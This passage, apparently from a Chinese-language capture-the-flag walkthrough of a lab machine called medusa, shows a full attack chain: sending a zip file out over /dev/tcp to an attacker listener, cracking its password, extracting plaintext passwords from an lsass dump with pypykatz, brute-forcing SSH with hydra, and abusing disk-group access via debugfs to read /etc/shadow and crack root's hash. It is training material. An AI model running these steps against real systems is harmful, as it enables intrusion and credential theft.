lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
www-data@medusa:/$ cd .../
www-data@medusa:/...$ ls -al
total 12108
drwxr-xr-x  2 root     root         4096 Jan 18  2023 .
drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
-rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
```

拷过去看看有啥

```
www-data@medusa:/...$ cat old_files.zip > /dev/tcp/192.168.205.128/7777

#kali
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 7777 > old_files.zip                
listening on [any] 7777 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 46026
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ unzip old_files.zip
Archive:  old_files.zip
   skipping: lsass.DMP               need PK compat. v5.1 (can do v4.6)
                                       
┌──(kali㉿kali)-[~/test]
└─$ 7z x old_files.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

  
Enter password (will not be echoed):
ERROR: Wrong password : lsass.DMP


Sub items Errors: 1


Break signaled
```

爆破一下

```
┌──(kali㉿kali)-[~/test]
└─$ zip2john old_files.zip > hash                       
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
No password hashes left to crack (see FAQ)
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --show hash                                    

old_files.zip/lsass.DMP:medusa666:lsass.DMP:old_files.zip:old_files.zip

1 password hash cracked, 0 left
                            
┌──(kali㉿kali)-[~/test]
└─$ 7z x old_files.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

  
Would you like to replace the existing file:
  Path:     ./lsass.DMP
  Size:     0 bytes
  Modified: 2023-01-17 22:12:41
with the file from archive:
  Path:     lsass.DMP
  Size:     34804383 bytes (34 MiB)
  Modified: 2023-01-17 22:12:41
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y      

              
Enter password (will not be echoed):
Everything is Ok

Size:       34804383
Compressed: 12387024
                                         
┌──(kali㉿kali)-[~/test]
└─$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

参考链接：https://technicalnavigator.in/how-to-extract-information-from-dmp-files/

```
┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP                
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 2261421 (2281ad)
session_id 18
username avijneyam
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:05:20.008398+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1016
luid 2261421

省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 


                   
```

提取一下

```
┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep "username"

INFO:pypykatz:Parsing file lsass.DMP
username avijneyam
                username avijneyam
                username avijneyam
                username avijneyam
username shelldredd
                username shelldredd
                username shelldredd
                username shelldredd
username powerful
                username powerful
                username powerful
                username powerful
username alienum
                username alienum
                username alienum
                username alienum
username Claor
                username Claor
                username Claor
                username Claor
username Pr0xy
                username Pr0xy
                username Pr0xy
                username Pr0xy
username nolo
                username nolo
                username nolo
                username nolo
username numero6
                username numero6
                username numero6
                username numero6
username ct0l4
                username ct0l4
                username ct0l4
                username ct0l4
username LordP4
                username LordP4
                username LordP4
                username LordP4
username sml
                username sml
                username sml
                username sml
username spectre
                username spectre
                username spectre
                username spectre
username RiJaba1
                username RiJaba1
                username RiJaba1
                username RiJaba1
username jabatron
                username jabatron
                username jabatron
                username jabatron
username InfayerTS
                username InfayerTS
                username InfayerTS
                username InfayerTS
username d4t4s3c
                username d4t4s3c
                username d4t4s3c
                username d4t4s3c
username cromiphi
                username cromiphi
                username cromiphi
                username cromiphi
username Medusa
                username Medusa
                username Medusa
                username Medusa
username Medusa
                username Medusa
                username Medusa
                username Medusa
username ANONYMOUS LOGON
username SERVICIO LOCAL
username MEDUSA-PC$
                username MEDUSA-PC$
                username MEDUSA-PC$
username 
username MEDUSA-PC$
                username MEDUSA-PC$
                username MEDUSA-PC$
                                                                                        

┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep "username"|awk -F ' ' '{print $2}'|sort | uniq
INFO:pypykatz:Parsing file lsass.DMP

alienum
ANONYMOUS
avijneyam
Claor
cromiphi
ct0l4
d4t4s3c
InfayerTS
jabatron
LordP4
Medusa
MEDUSA-PC$
nolo
numero6
powerful
Pr0xy
RiJaba1
SERVICIO
shelldredd
sml
spectre
               
┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep "password" 
INFO:pypykatz:Parsing file lsass.DMP
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password (hex)7400300070005f0073003300630072003300740000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password (hex)570068003100740033005f006800340063006b0000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password (hex)7400680033005f006200300073007300
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password 123456
                password (hex)31003200330034003500360000000000
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password None
                password (hex)
                password None
                password (hex)
                password None
                password (hex)
                password None
                password (hex)
                                                               

┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep "password"|awk '!/hex/'|awk -F ' ' '{print $2}'| sort | uniq
INFO:pypykatz:Parsing file lsass.DMP
123456
4l13num_qwerty
4v1jn3y4m_zxc
5p3ctr3_p0is0n_xX
b1zum_3_AM
b4ck3nd_pr0gr4m3r
br4in_br34k3r
br4in_br34k3r_v2
littl3_h4ck3r
littl3_h4ck3r_v2
n0s_v0lv1m0s_4_1lusi0n4r
n1mb3r_s1x
None
p0w3rf1ll_abc
pr0xy_ch41ns_456
t0p_s3cr3t
th3_b0ss
UnD3sc0n0c1d0
Wh1t3_h4ck
```

汇总一下

```
┌──(kali㉿kali)-[~/test]
└─$ cat user
alienum
ANONYMOUS
avijneyam
Claor
cromiphi
ct0l4
d4t4s3c
InfayerTS
jabatron
LordP4
Medusa
MEDUSA-PC$
nolo
numero6
powerful
Pr0xy
RiJaba1
SERVICIO
shelldredd
sml
spectre
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass  
123456
4l13num_qwerty
4v1jn3y4m_zxc
5p3ctr3_p0is0n_xX
b1zum_3_AM
b4ck3nd_pr0gr4m3r
br4in_br34k3r
br4in_br34k3r_v2
littl3_h4ck3r
littl3_h4ck3r_v2
n0s_v0lv1m0s_4_1lusi0n4r
n1mb3r_s1x
None
p0w3rf1ll_abc
pr0xy_ch41ns_456
t0p_s3cr3t
th3_b0ss
UnD3sc0n0c1d0
Wh1t3_h4ck
          
```

但是我们用户刚刚看只有spectre，所以我们先尝试爆破spectre先

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -l spectre -P pass ssh://192.168.205.145 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-04 18:33:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 22 tasks per 1 server, overall 22 tasks, 22 login tries (l:1/p:22), ~1 try per task
[DATA] attacking ssh://192.168.205.145:22/
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "spectre" - 1 of 22 [child 0] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "" - 2 of 22 [child 1] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "ertceps" - 3 of 22 [child 2] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "123456" - 4 of 22 [child 3] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "4l13num_qwerty" - 5 of 22 [child 4] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "4v1jn3y4m_zxc" - 6 of 22 [child 5] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "5p3ctr3_p0is0n_xX" - 7 of 22 [child 6] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "b1zum_3_AM" - 8 of 22 [child 7] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "b4ck3nd_pr0gr4m3r" - 9 of 22 [child 8] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "br4in_br34k3r" - 10 of 22 [child 9] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "br4in_br34k3r_v2" - 11 of 22 [child 10] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "littl3_h4ck3r" - 12 of 22 [child 11] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "littl3_h4ck3r_v2" - 13 of 22 [child 12] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "n0s_v0lv1m0s_4_1lusi0n4r" - 14 of 22 [child 13] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "n1mb3r_s1x" - 15 of 22 [child 14] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "None" - 16 of 22 [child 15] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "p0w3rf1ll_abc" - 17 of 22 [child 16] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "pr0xy_ch41ns_456" - 18 of 22 [child 17] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "t0p_s3cr3t" - 19 of 22 [child 18] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "th3_b0ss" - 20 of 22 [child 19] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "UnD3sc0n0c1d0" - 21 of 22 [child 20] (0/0)
[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "Wh1t3_h4ck" - 22 of 22 [child 21] (0/0)
[REDO-ATTEMPT] target 192.168.205.145 - login "spectre" - pass "br4in_br34k3r_v2" - 23 of 27 [child 1] (1/5)
[22][ssh] host: 192.168.205.145   login: spectre   password: 5p3ctr3_p0is0n_xX
[STATUS] attack finished for 192.168.205.145 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-04 18:33:20
```

登录

```
www-data@medusa:/...$ ls /home/
spectre
www-data@medusa:/...$ su - spectre
Password: 
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

disk我记得好像可以提权

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group

```
#查看系统分区和文件系统信息
df -h
#使用debugfs查看文件
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       6.9G  2.1G  4.5G  32% /
udev            471M     0  471M   0% /dev
tmpfs           489M     0  489M   0% /dev/shm
tmpfs            98M  504K   98M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000
spectre@medusa:~$ debugfs /dev/sda1
-bash: debugfs: command not found
spectre@medusa:~$ which debugfs
spectre@medusa:~$ find / -name debugfs 2>/dev/null
/usr/sbin/debugfs
spectre@medusa:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /root/.ssh/id_rsa
/root/.ssh/id_rsa: File not found by ext2_lookup 
debugfs:  cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
daemon:*:19372:0:99999:7:::
bin:*:19372:0:99999:7:::
sys:*:19372:0:99999:7:::
sync:*:19372:0:99999:7:::
games:*:19372:0:99999:7:::
man:*:19372:0:99999:7:::
lp:*:19372:0:99999:7:::
mail:*:19372:0:99999:7:::
news:*:19372:0:99999:7:::
uucp:*:19372:0:99999:7:::
proxy:*:19372:0:99999:7:::
www-data:*:19372:0:99999:7:::
backup:*:19372:0:99999:7:::
list:*:19372:0:99999:7:::
irc:*:19372:0:99999:7:::
gnats:*:19372:0:99999:7:::
nobody:*:19372:0:99999:7:::
_apt:*:19372:0:99999:7:::
systemd-network:*:19372:0:99999:7:::
systemd-resolve:*:19372:0:99999:7:::
messagebus:*:19372:0:99999:7:::
systemd-timesync:*:19372:0:99999:7:::
sshd:*:19372:0:99999:7:::
spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
```

拿去爆破

```
┌──(kali㉿kali)-[~/test]
└─$ echo 'root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::' > hash
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (root)   
1g 0:00:00:06 DONE (2025-02-04 18:39) 0.1455g/s 544.9p/s 544.9c/s 544.9C/s 19871987..street
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                 
```

登录

```
debugfs:  exit
debugfs: Unknown request "exit".  Type "?" for a request list.
debugfs:  
debugfs:  quit
spectre@medusa:~$ su -
Password: 
root@medusa:~# id
uid=0(root) gid=0(root) groups=0(root)
```


<!-- ##{"timestamp":1738666533}## -->